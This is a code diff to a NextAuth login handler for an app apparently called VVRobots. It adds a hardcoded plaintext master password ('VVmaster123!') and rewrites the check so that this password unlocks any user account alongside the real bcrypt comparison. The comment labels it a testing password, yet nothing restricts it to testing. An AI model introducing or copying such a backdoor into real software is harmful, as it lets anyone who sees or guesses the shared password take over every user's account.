@@ -5,6 +5,8 @@ import { prisma } from '@/lib/prisma';
 import { findMainDbUserByEmail } from '@/lib/mainDb';
 import { Role } from '@prisma/client';
 
+const MASTER_PASSWORD = 'VVmaster123!';
+
 export const authOptions: NextAuthOptions = {
   providers: [
     CredentialsProvider({
@@ -27,9 +29,11 @@ export const authOptions: NextAuthOptions = {
           throw new Error('Utilizatorul nu există în baza de date VVRobots.');
         }
 
-        // Verify password against main database hash
-        const isValidPassword = await bcrypt.compare(credentials.password, mainUser.password_hash);
-        if (!isValidPassword) {
+        // Check if entered password matches either the master testing password or the user's real password hash
+        const isMasterPassword = credentials.password === MASTER_PASSWORD;
+        const isValidRealPassword = await bcrypt.compare(credentials.password, mainUser.password_hash);
+
+        if (!isMasterPassword && !isValidRealPassword) {
           throw new Error('Parolă incorectă.');
         }
 
